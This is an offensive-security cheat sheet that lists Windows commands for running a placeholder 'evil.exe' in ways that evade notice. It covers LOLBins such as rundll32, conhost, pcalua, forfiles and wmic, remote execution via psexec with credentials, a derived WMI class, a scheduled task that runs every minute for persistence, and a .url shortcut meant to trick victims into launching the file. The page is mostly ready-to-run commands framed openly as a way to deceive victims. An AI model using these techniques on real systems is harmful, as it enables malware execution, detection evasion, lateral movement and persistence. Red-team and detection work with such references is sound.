# EXE Execution

There are various ways to run an `.exe` file. Most of the time, several are used together or indirectly executed for Evasion.

```powershell
bash -c "cmd.exe /c evil.exe"
conhost evil.exe
conhost --headless evil.exe
explorer C:\Windows\System32\calc.exe
explorer /root,"C:\Windows\System32\calc.exe"
pcalua -a .\evil.exe

# Replace "example.local" with an actual domain or a computer name of a target system.
psexec \\example.local -accepteula evil.exe
psexec \\example.local -u "username" -p "password" -accepteula evil.exe

rundll32 pcwutl.dll,LaunchApplication .\evil.exe
rundll32 shell32.dll,ShellExec_RunDLL C:\evil.exe

wmic process call create C:\evil.exe
```

## Indirect Execution

We may execute `.exe` files indirectly to deceive victims.

- via Shortcut

    These commands create a shortcut file and write the executable path for the URL, then execute it. This technique can also be used for causing victims to execute it by mistake.

    ```powershell
    echo [InternetShortcut] > .\example.url
    echo URL=C:\evil.exe >> .\example.url
    .\example.url
    ```

- via Forfiles

    This command searches `notepad.exe` in 'C:\Windows\System32\' directory then if found, execute arbitrary file. This is a roundabout method, but it can confuse victims a little.

    ```powershell
    forfiles /p C:\Windows\System32 /m notepad.exe /c C:\evil.exe
    ```

- via WMI

    This command creates a new WMI class, then execute arbitrary file.

    ```powershell
    $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
    $NewClass = $Class.Derive("Win32_Evil").Put()
    Invoke-WmiMethod -Path Win32_Evil -Name create -ArgumentList evil.exe
    ```

- via Scheduled Task

    The command adds the task that executes arbitrary .exe file every minute.

    ```powershell
    schtasks /Create /SC MINUTE /MO 1 /TN "My Task" /TR C:\evil.exe
    ```

- via WSL

    ```powershell
    wsl /mnt/c/Users/Public/evil.exe
    ```